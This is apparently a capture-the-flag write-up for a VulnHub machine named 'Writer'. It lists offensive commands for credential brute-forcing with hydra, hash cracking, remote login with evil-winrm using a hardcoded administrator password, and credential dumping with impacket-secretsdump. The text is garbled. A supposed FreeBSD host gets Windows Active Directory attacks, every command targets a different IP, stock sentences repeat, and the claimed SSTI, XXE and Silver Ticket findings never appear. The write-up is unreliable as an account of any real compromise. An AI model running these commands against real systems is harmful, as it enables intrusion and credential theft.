---
TitleSEO: "VulnHub — Writer (Hard FreeBSD) | ZureFX"
TitlePost: "VulnHub — Writer (Hard FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Writer. Silver Ticket and XXE to achieve hard compromise on FreeBSD."
Keywords: "reversing, easy, web, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-writer-264.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-writer-264/"
Date: "2025-05-28"
Tags: "Reversing, Easy, Web, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-writer-264"
Permalink: "/writeups/htb-writer-264.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Writer** is rated **Hard** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.14.71.109`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p443,3268,21 10.24.252.3 -oN scan.txt
evil-winrm -i 10.78.196.81 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.214.163/FUZZ
```

The scheduled task ran with elevated privileges and could be abused for escalation. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.109.191.28 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.49.25.203/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

### Web Enumeration

The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.122.173.206 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

Group Policy Preferences contained encrypted but recoverable credentials. The service account had excessive permissions assigned in Active Directory. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **ACL Abuse**.

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.96.12
gobuster dir -u http://10.91.231.83/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.103.124.195 -u administrator -p 'P@ssw0rd!' --shares
```

Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.67.93.123
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.62.219.116 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. The database credentials were hardcoded in the application source code.

```powershell
crackmapexec smb 10.61.201.39 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.22.211.249/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `kerbrute`
- `socat`
- `bloodhound`
- `impacket`
- `msfvenom`
- `mimikatz`
- `metasploit`
- `secretsdump`

### Key Takeaways

- Silver Ticket
- XXE
- ACL Abuse
- Remote File Inclusion
